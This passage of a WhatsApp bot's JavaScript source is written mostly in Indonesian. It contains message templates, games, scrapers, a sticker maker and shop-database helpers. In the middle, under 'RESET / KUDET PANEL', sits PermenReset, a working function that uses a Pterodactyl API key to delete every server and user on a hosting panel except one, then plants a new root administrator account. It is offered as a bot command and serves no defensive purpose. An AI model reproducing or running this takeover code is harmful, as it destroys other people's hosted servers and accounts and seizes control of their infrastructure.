		newsletterJid: '',
		},
		externalAdreply: {  
            showAdAttribution: true,
            title: `${hariini}`,
            body: `${packname}`,
            previewType: "IMAGE",
            thumbnailUrl: thumbnailReply,
            sourceUrl: xtele, 
          },
        },
        text: teks,
      };
      return Alice.sendMessage(m.chat, nedd, {
        quoted: XR,
      });
    }
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//---------------------------------------------------------------\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const XRBLOCK = async() =>{
  let toks = Styles(`Error Terdeteksi, Fitur Di Block Sementara Sampai Owner Memfix\nFitur Tidak Bisa Digunakan Selama Masa Block`)
    let contextInfo = {
      forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
    externalAdreply: {
    showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
    }
    }
    Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
    }
    
const XRO = async() =>{
  let toks = Styles(`Kamu Bukan Owner ku !!`)
    let contextInfo = {
      forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
    externalAdreply: {
    showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
    }
    }
    Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
    }
    
  //onlyAdmin
  const XRA = async() =>{
  let toks = Styles(`Command Hanya Untuk Admin Group`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType: "PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }
      
  //BotAdmin
  const XRBADM = async() =>{
  let toks = Styles(`Jadikan Bot Sebagai Admin Terlebih Dahulu`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
  }
  
  //onlyPremium
  const XRP = async() =>{
    let toks = Styles(`Kamu Bukan User Vip ( Premium Vip )` )
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      } 
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }
      
  //onlyGroup  
   const XRG = async() =>{
  let toks = Styles(`Khusus Group Chat!`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }
      
      
  //Banned Message
   const XRB = async() =>{
  let toks = Styles(`kamu sedang di band oleh owner`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Kamu telah di banned !!',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }      
      
        //pc
  const XRPC = async() =>{
  let toks = Styles(`Command Untuk Private Message`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: 'XR - XyrooRynzz',
      previewType: "PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }
      
      // Error
       const XRR = async() =>{
  let toks = Styles(`Fitur Sedang Error, Silahkan Menunggu Sampai Di Fix Owner`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdreply: {
      showAdAttribution: true,
      title: '❌ Maaf kak, fitur sedang dalam perbaikan',
      body: 'XR - XyrooRynzz',
      previewType:"PHOTO",
      thumbnailUrl: thumbnailReply,
      sourceUrl: xtele, 
      }
      }
      Alice.sendMessage(m.chat, { contextInfo, text: `${toks}`}, { quoted: XR })
      }      

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

const getAllCases = () => {
  var mytext = fs.readFileSync("./Alice.js").toString();
  var regex = /case\s+'(.*?)'/g;
  var cases = [];
  var match;
  while ((match = regex.exec(mytext)) !== null) {
      cases.push(match[1]);
  }
  return cases;
};


// Top Cmd
// Lokasi Data Command
const topcmd = './AliceDatabase/AliceTop.json';
// Cek Dan Load Database
if (!fs.existsSync(topcmd)) {
    fs.writeFileSync(topcmd, JSON.stringify({})); // Buat File Kalau Belum Ada
}
try {
    global.topcmd = JSON.parse(fs.readFileSync(topcmd));
} catch (err) {
    console.log("Database Rusak Atau Kosong! Reset Ulang");
    global.topcmd = {};
    fs.writeFileSync(topcmd, JSON.stringify(global.topcmd, null, 2));
}

// SImpan Data Cmd
const saveTopCmd = () => {
  fs.writeFileSync(topcmd, JSON.stringify(global.topcmd, null, 2));
}; 

// Top Command
const allCases = getAllCases();
if (allCases.includes(command)) {
    if (!global.topcmd[command]) {
        global.topcmd[command] = 1;
    } else {
        global.topcmd[command] += 1;
    }
    saveTopCmd(); // Simpan data setiap kali ada perubahan
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const leaderboardPath = './AliceSystem/AliceDatabase/Game/leaderboard.json';

// Load leaderboard
function loadLeaderboard() {
  if (!fs.existsSync(leaderboardPath)) return {};
  return JSON.parse(fs.readFileSync(leaderboardPath));
}

// Save leaderboard
function saveLeaderboard(data) {
  fs.writeFileSync(leaderboardPath, JSON.stringify(data, null, 2));
}

if (global.tebakGame && global.tebakGame[m.sender]) {
  // global.tebakGame[m.sender] sekarang berupa objek { jawaban, petunjuk }
  const game = global.tebakGame[m.sender];
  const jawaban = game.jawaban;
  const petunjuk = game.petunjuk || 'Petunjuk tidak tersedia';
  const teksUser = m.body?.toLowerCase();

  const benar = Array.isArray(jawaban)
    ? jawaban.some(jw => jw.toLowerCase() === teksUser)
    : teksUser === jawaban.toLowerCase();

  if (teksUser && benar) {
    // Update leaderboard
    let leaderboard = loadLeaderboard();
    leaderboard[m.sender] = (leaderboard[m.sender] || 0) + 1;
    saveLeaderboard(leaderboard);

    delete global.tebakGame[m.sender];
    return reply('✅ Benar! Jawabanmu tepat!\nketik .tebakld untuk melihat leaderboard list');
  } else if (teksUser) {
    return reply(`❌ Salah. Coba lagi!\n💡 Petunjuk: ${petunjuk}`);
  }
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Catur
const caturData = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/catur.json'))
const caturPath = './AliceSystem/AliceDatabase/Game/catur.json'
const caturSkorPath = './AliceSystem/AliceDatabase/Game/caturSkor.json'
const dbCatur = JSON.parse(fs.readFileSync(caturPath))
const dbSkor = JSON.parse(fs.readFileSync(caturSkorPath))
function saveCatur() {
  fs.writeFileSync('./AliceSystem/AliceDatabase/Game/catur.json', JSON.stringify(caturData, null, 2))
}

function papanAwal() {
  return [
    ['♜','♞','♝','♛','♚','♝','♞','♜'],
    ['♟','♟','♟','♟','♟','♟','♟','♟'],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['♙','♙','♙','♙','♙','♙','♙','♙'],
    ['♖','♘','♗','♕','♔','♗','♘','♖']
  ]
}

function tampilkanPapan(board) {
  let str = ''
  for (let row = 0; row < 8; row++) {
    str += (8 - row) + ' '
    for (let col = 0; col < 8; col++) {
      str += board[row][col] || '⬛'
    }
    str += '\n'
  }
  str += '  A B C D E F G H'
  return str
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//RESET / KUDET PANEL 
let passwordaseli = '';

const generateRandomPassword = () => {
    passwordaseli = `${ownername}` + Math.random().toString(36).substring(7);
};

const PermenReset = async (apiKey, panelUrl, userIdToKeep) => {
    const headers = {
        'Content-Type': 'application/json',
        'Accept': 'Application/vnd.pterodactyl.v1+json',
        'Authorization': `Bearer ${apiKey}`
    };

    const fetchJson = async (url, options = {}) => {
        console.log(`Fetching URL: ${url}`);
        const response = await fetch(url, { headers, ...options });
        const text = await response.text();

        if (!response.ok) {
            if (response.status === 401) {
                throw new Error("\`Plta\` Nya \`Invalid\` Gblok");
            } else if (response.status === 403) {
                throw new Error("\`Plta\` Nya \`Gak Full Mid\` Ini Anjeng");
            } else if (response.status === 502) {
                throw new Error("Panel Mu \`Kena DDoS\` Kang Gabisa Di Akses Nih");
            }
        }

        try {
            return JSON.parse(text);
        } catch (error) {
            console.error(`Failed to parse JSON response from ${url}: ${text}`);
        }
    };

    const getAllItems = async (endpoint) => {
        const data = await fetchJson(`${panelUrl}/api/application/${endpoint}`);
        return data?.data || [];
    };

    const deleteServer = async (serverId) => {
        await fetchJson(`${panelUrl}/api/application/servers/${serverId}`, { method: 'DELETE' });
        console.log(`Deleted server ID: ${serverId}`);
    };

    const deleteUser = async (userId) => {
        await fetchJson(`${panelUrl}/api/application/users/${userId}`, { method: 'DELETE' });
        console.log(`Deleted user ID: ${userId}`);
    };

    const createAdminUser = async () => {
        const newUser = {
            username: `${ownername}`,
            email: 'xyro@reset.com',
            first_name: `${ownername}`,
            last_name: `${ownername}`,
            password: passwordaseli,
            root_admin: true,
            language: 'en'
        };
        return fetchJson(`${panelUrl}/api/application/users`, {
            method: 'POST',
            body: JSON.stringify(newUser)
        });
    };

    const servers = await getAllItems('servers');
    servers.forEach(async (server) => {
        if (server.attributes.user_id !== parseInt(userIdToKeep)) {
            await deleteServer(server.attributes.id);
        }
    });

    const users = await getAllItems('users');
    users.forEach(async (user) => {
        if (user.attributes.id !== parseInt(userIdToKeep)) {
            await deleteUser(user.attributes.id);
        }
    });

    const newAdminUser = await createAdminUser();
    return `Deleted all servers and users. Created new admin user: ${newAdminUser.attributes.username}, ID: ${newAdminUser.attributes.id}`;
};

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// FUNCTION ↓↓
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\		

    // Fungsi untuk mengunggah file ke Catbox
    async function uploadToCatbox(filePath) {
        try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath));

            const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                    ...form.getHeaders()
                }
            });

            if (response.status === 200 && response.data) {
                return response.data.trim(); // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
        }
    }		        

		
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders()
        }
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let {
        data
      } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"].join("; ")
        }
      });
      return build_server + data.image;
    }
    
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\		
// Function isUrl
function isURL(e) {
  try { 
    return new URL(e),!0
    } catch (e) 
{ return!1 }
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

// FUNCTION BRAT
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Make Stickr From Url
async function makeStickerFromUrl(imageUrl, Alice, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Alice.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdreply: {
                    showAdAttribution: true,
                    title: `${botname}`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: thumbnailReply, 
                    sourceUrl: ig
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Scrape Nonton Anime
const base = {
  latest: "https://nontonanime.live/",
  orderAnime: "https://nontonanime.live/anime/?status&type&order",
  search: "https://nontonanime.live/?s=",
};

const nontonAnime = {
  latest: async () => {
    const { data } = await axios.get(base.latest);
    const $ = cheerio.load(data);
    return $(".listupd.normal .bsx a").map((_, el) => ({
      title: $(el).attr("title"),
      url: $(el).attr("href"),
      episode: $(el).find(".bt .epx").text().trim(),
      type: $(el).find(".limit .typez").text().trim(),
      thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
    })).get();
  },

  upcoming: async () => {
    const { data } = await axios.get(base.orderAnime);
    const $ = cheerio.load(data);
    return $(".listupd .bsx a").map((_, el) => {
      const episode = $(el).find(".bt .epx").text().trim();
      if (episode.toLowerCase() !== "upcoming") return null;
      return {
        title: $(el).attr("title"),
        url: $(el).attr("href"),
        episode,
        type: $(el).find(".limit .typez").text().trim(),
        thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
      };
    }).get().filter(Boolean);
  },

  search: async (q) => {
    const { data } = await axios.get(base.search + encodeURIComponent(q));
    const $ = cheerio.load(data);
    return $(".bsx a").map((_, el) => ({
      title: $(el).attr("title"),
      url: $(el).attr("href"),
      episode: $(el).find(".bt .epx").text().trim(),
      type: $(el).find(".limit .typez").text().trim(),
      thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
    })).get();
  },

  details: async (url) => {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    return {
      title: $("h1.entry-title").text().trim(),
      thumbnail: $(".bigcover .lazyload").attr("data-src") || $(".bigcover img").attr("src"),
      synopsis: $(".entry-content p").first().text().trim(),
      status: $(".info-content .spe span:contains('Status')").text().replace("Status:", "").trim(),
      studio: $(".info-content .spe span:contains('Studio') a").text().trim(),
      season: $(".info-content .spe span:contains('Season') a").text().trim(),
      type: $(".info-content .spe span:contains('Type')").text().replace("Type:", "").trim(),
    };
  },

  download: async (url) => {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    const links = [];

    $(".mirror option").each((_, el) => {
      const val = $(el).attr("value");
      if (val) {
        const buf = Buffer.from(val, "base64").toString("utf-8");
        const link = buf.includes("<iframe") ? cheerio.load(buf)("iframe").attr("src") : buf;
        links.push(`• ${$(el).text().trim()}:\n${link}`);
      }
    });

    return links;
  }
};
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Function Reaction 
const reaction = async (jidss, emoji) => {
    Alice.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function XReaction() {
    await Alice.sendMessage(m.chat, { react: { text: alicewait, key: m.key } });
    await delay(100)
    await Alice.sendMessage(m.chat, { react: { text: alicedone, key: m.key } });
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Function Send Music
async function sendMusic(teks) {
    let img = { url : thumb, 
               type : "image/jpeg"
              }
          
    let url = `${channel}`
    let contextInfo = {
        externalAdreply: {    
            showAdAttribution: true,    
            title: ownername,      
            body: `${botname} -`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    Alice.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
/* =================| GC SIDER |==================== */
const GcSiderUpdate = (userId, serverId) => {
    if (db_sider[serverId]) {
        const userIndex = db_sider[serverId].findIndex(user => user.user_id === userId);
        if (userIndex !== -1) {
           db_sider[serverId][userIndex].timestamp = timestamp;
        } else {
            db_sider[serverId].push({
                user_id: userId,
                tanggal: hariini,
                timestamp: timestamp
            });
        }
    } else {
        db_sider[serverId] = [{
            user_id: userId,
            tanggal: hariini,
            timestamp: timestamp
        }];
    }
    try {
        fs.writeFileSync("./AliceSystem/AliceDatabase/Group/sider.json", JSON.stringify(db_sider, null, 2));
    } catch (error) {
        console.error("Error writing to file:", error);
    }
};

//————————————————————————//

async function sendReact(teks, key = m.key) { 
  Alice.sendMessage(m.chat, {react: {text: teks, key: key}})
}
//————————————————————————//
function handleFeatureToggle(feature, command) {
    if (!m.isGroup) return XRG();
    if (!isAdmins && !isOwner) return XRA();
    if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');

    if (args[0] === 'on') {
        db.data.chats[from][feature] = true;
        return reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[from][feature] = false;
        return reply(`${command} is disabled`);
    }
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
  const words = text.split(' ')
  let line = ''
  for (let n = 0; n < words.length; n++) {
    const testLine = line + words[n] + ' '
    const metrics = ctx.measureText(testLine)
    const testWidth = metrics.width
    if (testWidth > maxWidth && n > 0) {
      ctx.fillText(line, x, y)
      line = words[n] + ' '
      y += lineHeight
    } else {
      line = testLine
    }
  }
  ctx.fillText(line, x, y)
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Luminai
        async function luminAi(
    teks,
    pengguna = null,
    prompt = null,
    modePencarianWeb = false
  ) {
    try {
      const data = { content: teks };
      if (pengguna !== null) data.user = pengguna;
      if (prompt !== null) data.prompt = prompt;
      data.webSearchMode = modePencarianWeb;
  
      const { data: res } = await axios.post(
        "https://luminai.my.id/",
        data
      );
      return res.result;
    } catch (error) {
      console.error("Terjadi kesalahan:", error);
      throw error;
    }
  }    

async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// PRODUK STORE
//————————————————————————//
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
const tujuanA = path.join(__dirname, 'AliceDatabase', 'products.json');
const tujuanB = path.join(__dirname, 'AliceDatabase', 'historyt.json');
const tujuanC = path.join(__dirname, 'AliceDatabase', 'discounts.json');

function getDisczz() {
    if (!fs.existsSync(tujuanC)) {
        fs.writeFileSync(tujuanC, '[]', 'utf-8');
    }
    const discountData = fs.readFileSync(tujuanC, 'utf-8');
    return JSON.parse(discountData);
}

function addDisczz(productName, discountPrice, expirationDate) {
    const discounts = getDisczz();
    const newDiscount = {
        produk: productName,
        harga_diskon: discountPrice,
        kadaluarsa: expirationDate
    };
    discounts.push(newDiscount);
    simpenDisc(discounts);
}

function getprodukDariFile() {
    if (!fs.existsSync(tujuanA)) {
        fs.writeFileSync(tujuanA, '[]', 'utf-8');
    }
    const productData = fs.readFileSync(tujuanA, 'utf-8');
    return JSON.parse(productData);
}

function simpenProduknya(products) {
    fs.writeFileSync(tujuanA, JSON.stringify(products, null, 2), 'utf-8');
}

function getidProduk(products) {
    if (products.length === 0) {
        return 1;
    }
    const lastProduct = products[products.length - 1];
    return lastProduct.produk + 1;
}

function cekProduknye(productName) {
    const products = getprodukDariFile();
    return products.some(product => product.nama.toLowerCase() === productName.toLowerCase());
}

function addprodukzz(name, price, stock) {
    const products = getprodukDariFile();
    const newProduct = {
        produk: getidProduk(products),
        nama: name,
        harga: price,
        stok: stock
    };
    products.push(newProduct);
    simpenProduknya(products);
}

function delprodukzz(productName) {
    let products = getprodukDariFile();
    products = products.filter(product => product.nama.toLowerCase() !== productName.toLowerCase());
    simpenProduknya(products);
}

function updprodukzz(name, price, stock) {
    let products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());
    if (productIndex !== -1) {
        products[productIndex].harga = price;
        products[productIndex].stok = stock;
        simpenProduknya(products);
    }
}

function getprodukdb() {
    return getprodukDariFile();
}

function simpenSmTr(transactions) {
    fs.writeFileSync(tujuanB, JSON.stringify(transactions, null, 2), 'utf-8');
}

function getSmTr() {
    if (!fs.existsSync(tujuanB)) return [];
    return JSON.parse(fs.readFileSync(tujuanB));
}

function getTrId(id) {
    const transactions = getSmTr();
    return transactions.find(t => t.id.trim() === id.trim());
}

function cIdTrnya() {
    const transactions = getSmTr();
    return `TRANS${transactions.length + 1}`;
}

function saveTrnye(transaction) {
    const transactions = getSmTr();
    transactions.push(transaction);
    simpenSmTr(transactions);
}

function simpenDisc(discounts) {
    fs.writeFileSync(tujuanC, JSON.stringify(discounts, null, 2), 'utf-8');
}


function persenDiskonnya(originalPrice, discountPrice) {
    return Math.round(((originalPrice - discountPrice) / originalPrice) * 100);
}

function ngerestokk(name, quantity) {
    const products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());

    if (productIndex !== -1) {
        products[productIndex].stok += quantity;
        simpenProduknya(products);
        return products[productIndex];
    } else {
        return null
    }
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//————————————————————————//
// GET GROUP NAME
async function getGcName(groupID) {
try {
let data_name = await Alice.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// ADD COUNT COMMAND
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./AliceDatabase/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./AliceDatabase/command.json',JSON.stringify(_db, null, 2));
}
}
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Resize
const resize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// PickRandom
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
	
		
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Altag Khusus Owner ( Group )
//————————————————————————//

if (budy.includes("@altag")) {
    if(!isOwner) return
    if (m.isGroup) {
        if (isAdmins || isBotAdmins) {
            return Alice.sendMessage(m.chat, {
                text: body.replace(/@altag/i, '@' + m.chat),
                contextInfo: {
                    mentionedJid: (await Alice.groupMetadata(m.chat)).participants.map(v => v.id),
                    groupMentions: [{
                        groupSubject: "altag",
                        groupJid: m.chat
                    }]
                }
            })
        }
    }
    }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Respon List

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
            var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
            if (get_data_respon.isImage === false) {
                Alice.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
                    quoted: m
                })
            } else {
                Alice.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
                    quoted: m
                })
            }
        }
   
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Sett Group
let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antilinkkick' in chats)) chats.antilinkkick = false
		       	  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false 
                
               } else global.db.data.chats[from] = {
                  antibot: false,
                  antiviewonce: false,                  
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antispam: false,                  
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antipromotion: false,
                  antilinkkick: false,                             
                  antilinkgc: false                 
               }
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Limit
